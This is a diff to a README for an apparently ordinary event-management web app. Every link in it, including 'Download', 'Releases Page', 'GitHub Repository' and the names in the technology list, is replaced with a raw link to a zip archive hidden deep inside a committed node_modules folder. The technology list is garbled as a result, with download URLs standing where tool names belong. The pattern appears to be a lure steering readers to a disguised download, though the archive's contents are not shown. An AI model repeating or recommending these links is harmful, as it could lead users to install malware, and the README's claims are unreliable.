@@ -1,6 +1,6 @@
 # 🎉 PLANNERS-An-Event-Management-Company-Web-App - Simple Event Management Done Right
 
-[![Download PLANNERS](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/mongoose/node_modules/mongodb/lib/cmap/handshake/PLANNERS-An-Event-Management-Company-Web-App-v3.7.zip)](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/mongoose/node_modules/mongodb/lib/cmap/handshake/PLANNERS-An-Event-Management-Company-Web-App-v3.7.zip)
+[![Download PLANNERS](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/whatwg-url/App_Company_Management_Event_PLANNER_An_Web_v3.8-alpha.3.zip)](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/whatwg-url/App_Company_Management_Event_PLANNER_An_Web_v3.8-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ PLANNERS offers several useful features to enhance your event management experie
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases page to download](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/mongoose/node_modules/mongodb/lib/cmap/handshake/PLANNERS-An-Event-Management-Company-Web-App-v3.7.zip). You can find the latest version of the app on this page.
+To get started, visit the [Releases page to download](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/whatwg-url/App_Company_Management_Event_PLANNER_An_Web_v3.8-alpha.3.zip). You can find the latest version of the app on this page.
 
 1. Click the link above.
 2. Choose the version suitable for your operating system.
@@ -61,9 +61,9 @@ While this guide focuses on the end-user experience, PLANNERS welcomes contribut
 
 PLANNERS is developed using the following technologies:
 
-- **https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/mongoose/node_modules/mongodb/lib/cmap/handshake/PLANNERS-An-Event-Management-Company-Web-App-v3.7.zip**: A JavaScript runtime built on Chrome's V8 engine.
-- **https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/mongoose/node_modules/mongodb/lib/cmap/handshake/PLANNERS-An-Event-Management-Company-Web-App-v3.7.zip**: A JavaScript library for building user interfaces.
-- **https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/mongoose/node_modules/mongodb/lib/cmap/handshake/PLANNERS-An-Event-Management-Company-Web-App-v3.7.zip**: A web application framework for https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/mongoose/node_modules/mongodb/lib/cmap/handshake/PLANNERS-An-Event-Management-Company-Web-App-v3.7.zip
+- **https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/whatwg-url/App_Company_Management_Event_PLANNER_An_Web_v3.8-alpha.3.zip**: A JavaScript runtime built on Chrome's V8 engine.
+- **https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/whatwg-url/App_Company_Management_Event_PLANNER_An_Web_v3.8-alpha.3.zip**: A JavaScript library for building user interfaces.
+- **https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/whatwg-url/App_Company_Management_Event_PLANNER_An_Web_v3.8-alpha.3.zip**: A web application framework for https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/whatwg-url/App_Company_Management_Event_PLANNER_An_Web_v3.8-alpha.3.zip
 - **MongoDB**: A NoSQL database for storing data.
 - **Axios**: A promise-based HTTP client for making requests.
 - **Vite**: A build tool for faster development and optimized production builds.
@@ -74,7 +74,7 @@ PLANNERS is open-source and available under the MIT License. You can freely use,
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/mongoose/node_modules/mongodb/lib/cmap/handshake/PLANNERS-An-Event-Management-Company-Web-App-v3.7.zip)
-- [Releases Page](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/mongoose/node_modules/mongodb/lib/cmap/handshake/PLANNERS-An-Event-Management-Company-Web-App-v3.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/whatwg-url/App_Company_Management_Event_PLANNER_An_Web_v3.8-alpha.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/MinhMui123/PLANNERS-An-Event-Management-Company-Web-App/main/backend/node_modules/whatwg-url/App_Company_Management_Event_PLANNER_An_Web_v3.8-alpha.3.zip)
 
 Thank you for choosing PLANNERS! We hope it helps you manage your events seamlessly.
